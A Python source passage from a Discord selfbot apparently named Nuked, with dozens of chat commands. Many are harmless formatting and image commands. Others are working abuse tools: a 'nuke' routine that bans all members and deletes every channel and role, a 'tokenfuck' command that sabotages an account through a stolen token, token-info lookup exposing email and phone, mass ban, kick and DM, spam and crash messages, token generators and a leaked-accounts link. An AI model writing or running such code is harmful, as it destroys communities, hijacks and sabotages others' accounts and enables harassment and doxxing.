    embed.add_field(name="Highest Role", value=member.top_role.mention)
    await ctx.send(embed=embed, delete_after=20)

@client.command(aliases=['clear'])
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.channel.history(limit=amount):
        if message.author == client.user:
            await message.delete()
        else:
            pass


@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(f'{message}\n' * 15)


@client.command(aliases=['webping'])
async def pingsite(ctx, *, website):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            embed = discord.Embed(title="**Website is down.**", description=f"responded with a status code of {r}",
                                  color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
            await ctx.send(embed=embed, delete_after=val)
        else:
            embed = discord.Embed(title="**Website is online.**", description=f"responded with a status code of {r}",
                                  color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
            await ctx.send(embed=embed, delete_after=val)


@client.command(aliases=['exit'])
async def logout(ctx):
    await ctx.message.delete()
    await ctx.send("logging out..", delete_after=0.2)
    await asyncio.sleep(2)
    exit(0)


@client.command(aliases=['tard'])
async def clown(ctx, arg):
    await ctx.message.delete()
    if arg == "":
        await ctx.send("specify someone to clown tard", delete_after=5)
    try:
        embed = discord.Embed(title="**you're a clown**", color=0xFFFAFA,
                              description=f"{arg} is a fucking clown \n lol \n ur so unfunny", timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        await ctx.send(embed=embed, delete_after=val)
    except Exception as err:
        await ctx.send(f"Error: {err}", delete_after=1)


@client.command(aliases=['free'])
async def freeaccounts(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Free Accounts**", color=0xFFFAFA,
                          description="use this link for free accounts and shit \n \nhttps://leak.sx/", timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed)


@client.command(aliases=['token'])
async def tokengen(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Token Generator**", color=0xFFFAFA,
                          description=f"Generated Token below, **THESE WILL NOT ALWAYS WORK** \n \n {tokengener()}", timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)


@client.command(aliases=['discfuck'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': True,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible",
        'custom_status': "token fucked by https://github.com/kyliex/nuked"
    }
    guild = {
        'channels': None,
        'icon': "https://i.imgur.com/QHq1tiY.png",
        'name': "NUKED",
        'region': "europe"
    }
    for _i in range(100):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break

@client.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%m/%d/%Y, %H:%M:%S %p UTC')
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token" + Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})",
        color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em, delete_after=val)


@client.command(aliases=['porn'])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekobot.xyz/api/image?type=pussy").json()
    embed = discord.Embed(color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=str(r["message"]))
    await ctx.send(embed=embed, delete_after=val)

@client.command(aliases=['av'])
async def avatar(ctx, *, member: discord.Member = None):
    await ctx.message.delete()
    embed = discord.Embed(title=f"{member}'s avatar", color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    avatarurl = member.avatar_url
    embed.set_image(url=avatarurl)
    await ctx.send(embed=embed, delete_after=val)


@client.command()
async def info(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Selfbot Information**", color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.add_field(name="**made in**", value="discord.py")
    embed.add_field(name="**made by**", value="kylie#1337")
    embed.add_field(name="**running under the user**", value=f"{client.user.name}#{client.user.discriminator}")
    embed.set_footer(text="kylie#1337 <3")
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def dmall(ctx, *, message):
    await ctx.message.delete()
    try:
        for m in ctx.guild.members:
            await m.send(message)
    except:
        pass
    
@client.command(aliases=['rep'])
async def spamreport(ctx, member: discord.Member = None):
    await ctx.message.delete()
    for i in range(15):
        await ctx.send(f"Report sent to Discord for <@{member.id}>", delete_after=1)


@client.command()
async def cls(ctx):
    await ctx.message.delete()
    clear()
    splash()
    
@client.command()
async def normalspam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for i in range(amount):
        await ctx.send(message)


@client.command()
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await client.change_presence(activity=game)


@client.command()
async def listening(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))

async def destroy(ctx):
    for user in ctx.guild.members:
        try:
            await user.ban()
        except:
            pass
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="https://github.com/appendable/nuked",
            description="Nuked ON TOP",
            reason="idk",
            icon=None,
            banner=None
        )
    except:
        pass

async def masschannel(ctx):
    for _i in range(250):
        await ctx.guild.create_text_channel(name="get nuked lol")

async def massrole(ctx):
    for _i in range(249):
        await ctx.guild.create_role(name="get nuked lol")

@client.command(aliases=['serverfuck'])
async def nuke(ctx):
    await ctx.message.delete()
    Thread(target=await destroy(ctx)).start()
    Thread(target=await masschannel(ctx)).start()
    Thread(target=await massrole(ctx)).start()

@client.command(aliases=['mtg'])
async def masstokens(ctx):
    await ctx.message.delete()
    masstokengen()
    embed = discord.Embed(title="**Generated 300 tokens.**", color=0xFFFAFA, description="generated 300 tokens in tokens.txt. these might not work.", timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed)

@client.command(aliases=['extensiveinfo', 'showtoken'])
async def clientinfo(ctx):
    await ctx.message.delete()
    await ctx.send("Extensive client info now in console. Warning: It contains user token!", delete_after=5)
    print("Token: " + token)
    print(f"Email: {client.user.email}")
    print(f"Nitro?: {format(client.user.premium)}")
    print(f"Verified?: {format(client.user.verified)}")
    print("Name: " + client.user.name)
    await asyncio.sleep(15)
    clear()
    splash()

@client.command(aliases=['bit'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    embed = discord.Embed(title='**BTC**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.add_field(name="**USD**", value=usd)
    embed.add_field(name="**EUR**", value=eur)
    embed.add_field(name="**GBP**", value=gbp)
    await ctx.send(embed=embed, delete_after=val)

@client.command(aliases=['geoip', 'iplookup'])
async def geo(ctx, arg):
    await ctx.message.delete()
    try:
        r = requests.get(f'http://ip-api.com/json/{arg}')
        embed = discord.Embed(title='**IP Lookup**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name="**ISP**", value=r.json()['isp'], inline=False)
        embed.add_field(name="**ASN**", value=r.json()['as'], inline=False)
        embed.add_field(name="**City**", value=r.json()['city'], inline=False)
        embed.add_field(name="**Country**", value=r.json()['country'], inline=False)
        embed.add_field(name="**Region**", value=r.json()['regionName'], inline=False)
        embed.add_field(name="**Longitude**", value=r.json()['lon'], inline=False)
        embed.add_field(name="**Latitude**", value=r.json()['lat'], inline=False)
        embed.add_field(name="**Status**", value=r.json()['status'], inline=False)

        await ctx.send(embed=embed, delete_after=val)
    except Exception as e:
        print(Fore.RED + "[ERROR] " + Fore.RESET + Fore.YELLOW + str(e))
        
@client.command()
async def kiss(ctx, member : discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/kiss")
    embed = discord.Embed(description=f"<@{client.user.id}> kisses <@{member.id}>", color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r.json()['url'])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def hug(ctx, member : discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/hug")
    embed = discord.Embed(description=f"<@{client.user.id}> hugs {member.mention}", color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r.json()['url'])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def boobs(ctx, member : discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    embed = discord.Embed(color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r.json()['url'])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def cat(ctx, member : discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/meow")
    embed = discord.Embed(color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r.json()['url'])
    await ctx.send(embed=embed, delete_after=val)


@client.command(aliases=['fakedox', 'dox'])
async def userdox(ctx, member : discord.Member=None):
    await ctx.message.delete()
    embed = discord.Embed(title=f"{member}", color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.add_field(name='**Token**', value=f"{base64.b64encode(bytes(str(member.id), 'utf-8')).decode() + '...'}", inline=False)
    embed.add_field(name='**Address**', value=randaddr(), inline=False)
    embed.add_field(name='**Phone Number**', value=f"+1 {''.join(random.choices(numbers, k=10))}")
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def query(ctx, *, message):
    await ctx.message.delete()
    embed = discord.Embed(title="**Search Query**", color=0xFFFAFA, description=searchq(link=message), timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def joke(ctx):
    await ctx.message.delete()
    r = requests.get("https://sv443.net/jokeapi/v2/joke/Any?type=single")
    embed = discord.Embed(title="**Joke**", color=0xFFFAFA, description=f"{r.json()['joke']}", timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)


@client.command()
async def setname(ctx, *, message):
    await ctx.message.delete()
    await client.user.edit(username=message, password=password)

@client.command(aliases=['allguilds'])
async def allservers(ctx):
    await ctx.message.delete()
    async for guild in client.fetch_guilds():
        print(guild)
    await asyncio.sleep(25)
    splash()


@client.command(aliases=['scrape'])
async def proxy(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Proxy**", color=0xFFFAFA, description=pscrape(), timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def embed(ctx, *, message):
    await ctx.message.delete()
    embed = discord.Embed(color=0xFFFAFA, description=message, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_author(name=str(client.user.display_name + "#" + client.user.discriminator), icon_url=client.user.avatar_url)
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')

@client.command()
async def italics(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('*' + message + '*')

@client.command(aliases=['st'])
async def strike(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('~~' + message + '~~')

@client.command(aliases=['uline'])
async def underline(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('__' + message + '__')

@client.command(aliases=['hide'])
async def hidden(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')

@client.command(aliases=['hspam'])
async def hiddenspam(ctx):
    await ctx.message.delete()
    await ctx.send("||" + '\n'*1996 + '||')

@client.command()
async def wyr(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    embed = discord.Embed(color=0xFFFAFA, description=f'{qa}\n{qor}\n{qb}', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def id(ctx, member: discord.Member=None):
    await ctx.message.delete()
    if not member:
        pass
    try:
        embed = discord.Embed(description=f"**{member.mention}'s ID**\n\n{member.id}",color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        await ctx.send(embed=embed, delete_after=val)
    except:
        await ctx.send(f"{member}'s ID" + '\n' + str(member.id), delete_after=val)


@client.command()
async def slap(ctx, user: discord.Member=None):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    embed = discord.Embed(description=f"{client.user.mention} slaps {user.mention}", color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=res['url'])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def tickle(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/tickle').json()
    embed = discord.Embed(description=f"{client.user.mention} tickles {member.mention}", color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r['url'])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def spank(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/spank').json()
    embed = discord.Embed(description=f"{client.user.mention} spanks {member.mention}", color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r['url'])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def setnicks(ctx, *, message):
    await ctx.message.delete()
    for member in ctx.message.guild.members:
        try:
            await member.edit(nick=message)
        except Exception as e:
            print(e)

@client.command()
async def revertnicks(ctx):
    await ctx.message.delete()
    for member in ctx.message.guild.members:
        try:
            await member.edit(nick=None)
        except:
            pass

@client.command()
async def guildname(ctx, *, message):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.edit(name=message)

@client.command()
async def channel(ctx, *, message):
    await ctx.message.delete()
    await ctx.guild.create_text_channel(name=message)


@client.command()
async def encode(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(base64.b64encode(bytes(message, 'utf-8')).decode())

@client.command()
async def decode(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(base64.b64decode(bytes(message, 'utf-8')).decode())

@client.command()
async def getpfp(ctx, member: discord.Member=None):
    await ctx.message.delete()
    print(Fore.LIGHTBLUE_EX + f'{member.display_name}#{member.discriminator}\'s profile picture link: ' + Fore.LIGHTGREEN_EX + str(member.avatar_url))
    await asyncio.sleep(20)
    splash()

@client.command()
async def massban(ctx):
    await ctx.message.delete()
    for member in ctx.message.guild.members:
        await member.ban()



@client.command()
async def getallpfp(ctx, member: discord.Member=None):
    await ctx.message.delete()
    txtfile = open(f'{ctx.message.guild} pfps.txt', 'w')
    try:
        for member in ctx.message.guild.members:
            txtfile.write(f'{member.display_name}#{member.discriminator}\'s profile picture link: {member.avatar_url}\n')
    except:
        pass

@client.command()
async def fakelink(ctx, link1, link2):
    await ctx.message.delete()
    await ctx.send(link1 + ' ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| ' + link2)

@client.command()
async def addy(ctx):
    await ctx.message.delete()
    await ctx.send(randaddr())

@client.command()
async def poll(ctx, *, message):
    await ctx.message.delete()
    embed = discord.Embed(title="**Poll**", color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.add_field(name=f"{message}", value="✅ ❌", inline=False)
    message = await ctx.send(embed=embed, delete_after=250)
    await message.add_reaction("✅")
    await message.add_reaction("❌")
    
@client.command()
async def settings(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title='**Settings**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.add_field(name='**Prefix**', value=client.command_prefix, inline=False)
    embed.add_field(name='**Nitro Sniper**', value='Active', inline=False)
    embed.add_field(name='**Mention Logger**', value=message_logger, inline=False)
    embed.add_field(name='**Mention Blocker**', value=mentionblocker, inline=False)
    embed.add_field(name='**Rich Presence**', value=rich_presence, inline=False)
    embed.set_footer(text=f'Logged in as {client.user.display_name}#{client.user.discriminator} | Command prefix is \'{client.command_prefix}\' | Nuked')
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def ghostping(ctx, amount: int, arg):
    await ctx.message.delete()
    for i in range(int(amount / 2)):
        await ctx.send(arg, delete_after=0.001)
        await ctx.send(arg, delete_after=0.001)
        await ctx.send(arg, delete_after=0.001)
        await asyncio.sleep(15)

@client.command()
async def ping(ctx, ip):
    await ctx.message.delete()
    await ctx.send(pingip(ip), delete_after=val)

@client.command()
async def masskick(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        await member.kick()

@client.command()
async def fuck(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://api.neko-chxn.xyz/v1/fuck/img').json()
    embed = discord.Embed(description=f'{client.user.mention} fucks {member.mention}', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["url"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def ascii(ctx, *, message):
    await ctx.message.delete()
    result = pyfiglet.figlet_format(message)
    if len(result) > 1992:
        return
    else:
        await ctx.send('```' + result + '```')

@client.command()
async def download(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Use this link to download Nuked**", color=0xFFFAFA, description="https://github.com/appendable/nuked", timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)

async def get_portscan(ip):
    results = os.popen(f'nmap {ip}').read()
    return f'```{results}```'

@client.command()
async def nmap(ctx, ip):
    await ctx.message.delete()
    try:
        results = await get_portscan(ip)
        await ctx.send(results)
    except Exception as e:
        await ctx.send(e)

@client.command()
async def tweet(ctx, username, *, message):
    await ctx.message.delete()
    r = requests.get(f'https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}').json()
    embed = discord.Embed(color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["message"])
    await ctx.send(embed=embed, delete_after=val)


@client.command()
async def read(ctx):
    await ctx.message.delete()
    for guild in client.guilds:
            await guild.ack()
            await asyncio.sleep(1)

@client.command()
async def phcomment(ctx, user, *, message):
    await ctx.message.delete()
    r = requests.get(f'https://nekobot.xyz/api/imagegen?type=phcomment&text={message}&username={user}&image=https://i.imgur.com/raRKTgZ.jpg').json()
    embed = discord.Embed(color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["message"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def setprefix(ctx, arg):
    await ctx.message.delete()
    old = client.command_prefix
    client.command_prefix = arg
    embed = discord.Embed(title=f'**Prefix Changed Successfully**', description=f'Prefix changed from **{old}** to **{client.command_prefix}**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    try:
        await ctx.send(embed=embed, delete_after=val)
    except:
        pass
    clear()
    splash()

@client.command(aliases=['serverinfo'])
async def guildinfo(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title='**Guild Info**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    guild = ctx.message.guild
    roles = [role.mention for role in reversed(guild.roles)]
    embed.add_field(name='**Owner**', value=f'<@{ctx.message.guild.owner_id}>', inline=False)
    embed.add_field(name='**Created At**', value=guild.created_at, inline=False)
    embed.add_field(name='**Amount of Roles**', value=len(guild.roles), inline=False)
    embed.add_field(name='**Amount of Members**', value=len(guild.members), inline=False)
    embed.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=embed, delete_after=val)

@client.command(aliases=['fbackup'])
async def backup(ctx):
    await ctx.message.delete()
    ff = open('backup.txt', 'w', encoding='utf-8')
    ff.write(f'Backup for user {client.user.display_name}#{client.user.discriminator}\nFriend Count: {len(client.user.friends)}\nServer Count: {len(client.guilds)}\nBackup Date: {datetime.datetime.now().strftime("%m/%d/%Y, %H:%M:%S %p")}\n')
    for friend in client.user.friends:
        ff.write(f'\nFriend:\n{friend.name}#{friend.discriminator}\nID:\n{friend.id}\n')
    for guild in client.guilds:
        ff.write(f'\nServer:\n{guild.name}\nID:\n{guild.id}\nOwner ID: {guild.owner_id}\n')
    ff.close()

@client.command()
async def restart(ctx):
    await ctx.message.delete()
    clear()
    os.system('python "' + os.getcwd() + "\\" + sys.argv[0] + '"')


@client.command()
async def streaming(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="https://www.twitch.tv/monstercat"
    )
    await client.change_presence(activity=stream)

@client.command()
async def oldsplash(ctx):
    await ctx.message.delete()
    clear()
    old_splash()

@client.command()
async def newsplash(ctx):
    await ctx.message.delete()
    clear()
    splash()

@client.command()
async def bite(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://api.neko-chxn.xyz/v1/bite/img').json()
    embed = discord.Embed(description=f'{client.user.mention} bites {member.mention}', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["url"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def cuddle(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://api.neko-chxn.xyz/v1/cuddle/img').json()
    embed = discord.Embed(description=f'{client.user.mention} cuddles {member.mention}', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["url"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def kill(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://api.neko-chxn.xyz/v1/kill/img').json()
    embed = discord.Embed(description=f'{client.user.mention} kills {member.mention}', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["url"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get('https://api.neko-chxn.xyz/v1/hentaiimg/img').json()
    embed = discord.Embed(color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["url"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def lick(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://api.neko-chxn.xyz/v1/lick/img').json()
    embed = discord.Embed(description=f'{client.user.mention} licks {member.mention}', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["url"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def allcommands(ctx):
    await ctx.message.delete()
    await ctx.send('```' + '\n'.join([str for str in client.all_commands]) + '```', delete_after=val)

@client.command()
async def github(ctx):
    await ctx.message.delete()
    webbrowser.open_new('https://github.com/kyliex')

@client.command()
async def trumptweet(ctx, *, message):
    await ctx.message.delete()
    r = requests.get(f'https://nekobot.xyz/api/imagegen?type=trumptweet&text={message}').json()
    embed = discord.Embed(color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["message"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def clyde(ctx, *, message):
    await ctx.message.delete()
    r = requests.get(f'https://nekobot.xyz/api/imagegen?type=clyde&text={message}').json()
    embed = discord.Embed(color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["message"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def crash(ctx):
    await ctx.message.delete()
    for i in range(25):
        await ctx.send(':grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face: ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽:grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses:')
